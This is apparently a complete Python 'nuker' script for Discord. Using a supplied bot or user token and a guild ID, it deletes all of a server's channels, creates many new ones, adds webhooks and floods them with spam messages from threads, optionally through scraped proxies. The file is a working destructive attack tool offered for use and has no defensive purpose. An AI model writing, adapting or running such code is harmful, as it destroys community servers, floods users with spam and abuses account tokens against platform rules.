from util.proxies import proxy_scrape, proxy
import os
import random
import time
import asyncio
import aiohttp
from pystyle import Colors, Center, Colorate
import sys
import json
import threading
import urllib3

__author__ = 'WebUwU'

with open('config.json', 'r') as f:
    config = json.load(f)
    TOKEN = config["TOKEN"]
    MESSAGE = config["MESSAGE"]
    AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
    SPAM_PRN = config["SPAM_PRN"]
    PROXIES = config["PROXIES"]
    MESSAGES_PER_CHANNEL = config["MESSAGES_PER_CHANNEL"]
    CHANNEL_NAME = config["CHANNEL_NAME"]
    WEBHOOK_NAME = config["WEBHOOK_NAME"]
    

banner = Center.XCenter("""
             
  █████████  ███                                   ██████   █████          █████                        
 ███░░░░░███░░░                                   ░░██████ ░░███          ░░███                         
░███    ░░░ ████   ███████ █████████████    ██████ ░███░███ ░███ █████ ████░███ █████  ██████  ████████ 
░░█████████░░███  ███░░███░░███░░███░░███  ░░░░░███░███░░███░███░░███ ░███ ░███░░███  ███░░███░░███░░███
 ░░░░░░░░███░███ ░███ ░███ ░███ ░███ ░███   ███████░███ ░░██████ ░███ ░███ ░██████░  ░███████  ░███ ░░░ 
 ███    ░███░███ ░███ ░███ ░███ ░███ ░███  ███░░███░███  ░░█████ ░███ ░███ ░███░░███ ░███░░░   ░███     
░░█████████ █████░░███████ █████░███ █████░░████████████  ░░█████░░████████████ █████░░██████  █████    
 ░░░░░░░░░ ░░░░░  ░░░░░███░░░░░ ░░░ ░░░░░  ░░░░░░░░░░░░    ░░░░░  ░░░░░░░░░░░░ ░░░░░  ░░░░░░  ░░░░░     
                  ███ ░███                                                                              
                 ░░██████                                                                               
                  ░░░░░░                                                                                
                                                    
                           Made by WebUwU :3 |  join server discord.gg/boobss\n\n
""")
print(Colorate.Vertical(Colors.red_to_purple, banner, 2))

all_choices = f"""
Token = {TOKEN}
Message = {MESSAGE}
Ammount of channels = {AMMOUNT_OF_CHANNELS}
Spam PRN = {SPAM_PRN}
Proxies = {PROXIES}
Messages per channel = {MESSAGES_PER_CHANNEL}
Channel name = {CHANNEL_NAME}
Webhook name = {WEBHOOK_NAME}
"""

lines = all_choices.split("\n")
new_lines = []
for line in lines:
    index_of_equal = line.find("=")
    if index_of_equal == -1:
        continue
    key = line[:index_of_equal].strip()
    value = line[index_of_equal+1:].strip()
    key = Colorate.Color(Colors.purple, key, False)
    value = Colorate.Color(Colors.red, value, False)
    new_lines.append(key + " = " + value)

all_choices = "\n".join(new_lines)
print(all_choices)
print(Colorate.Color(Colors.purple, '', False))



api = "https://discord.com/api/v9"
nwords = None
bot_or_person = input("Is this a bot token or a person (user) token? | (bot/person) ")

if bot_or_person == "bot":
    token = TOKEN
    nwords = {
    'Authorization': f'Bot {token}',
    'Content-Type': 'application/json'}
    
elif bot_or_person == "person":
    token = TOKEN
    nwords = {"Authorization": f"{token}"}

else:
    print("Invalid option!")
    sys.exit()

guild = input("What is the guild id of the server you are nuking? -> ")
async def main():
    async with aiohttp.ClientSession() as schinken:
        async with schinken.get('https://discord.com/api/v9/users/@me', headers=nwords) as r:
            if r.status == 200:
                print("Token is valid!")
            else:
                print("Token is invalid!")
                sys.exit()
        async with schinken.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r:
            channel_id = await r.json()
            async with schinken.get(headers = nwords, url = f'{api}/guilds/{guild}/channels') as f:
                channel_id = await f.json()
                for channel in channel_id:
                    await schinken.delete(f'{api}/channels/{channel["id"]}', headers=nwords)
        for i in range(int(AMMOUNT_OF_CHANNELS)):
            channel = await schinken.post(f'{api}/guilds/{guild}/channels', headers=nwords, json={"name": CHANNEL_NAME, "type": 0})
            data_channel = await channel.json()
            channel_id = data_channel["id"]
            try:
                async with schinken.post(f'{api}/channels/{channel_id}/webhooks', headers=nwords, json={"name": WEBHOOK_NAME }) as r: # must add "avatar": WEBHOOK_PROFILE funktion
                    webhook_raw = await r.json()
                    webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                    threading.Thread(target=spamhook, args=(webhook,)).start()
            except:
                print('U ratelimited af :skul:')

def spamhookp(hook):
    for i in range(MESSAGES_PER_CHANNEL):
        http = urllib3.PoolManager()
        if SPAM_PRN == True:
            try:
                with open('random.txt') as f:
                    lines = f.readlines()
                    random_int = random.randint(0,len(lines)-1)
                    ran = lines[random_int]
                http.request('POST', hook, fields={'content': f"{MESSAGE} + {ran}"}, proxy_url=proxy())
            except:
                print(f'error spamming! {hook}')
        else:
            try:
                http.request('POST', hook, fields={'content': MESSAGE}, proxy_url=proxy())
            except:
                print(f'error spamming! {hook}')
    sys.exit()

        
def spamhook(hook):
    for i in range(MESSAGES_PER_CHANNEL):
        http = urllib3.PoolManager()
        if SPAM_PRN == True:
            try:
                with open('random.txt') as f:
                    lines = f.readlines()
                    random_int = random.randint(0,len(lines)-1)
                    ran = lines[random_int]
                http.request('POST', hook, fields={'content': f"{MESSAGE} + {ran}"})
            except:
                print(f'error spamming! {hook}')
        else:
            try:
                http.request('POST', hook, fields={'content': MESSAGE})
            except:
                print(f'error spamming! {hook}')
    sys.exit()

if PROXIES == True:
    proxy_scrape()

if __name__ == '__main__':
    asyncio.run(main())
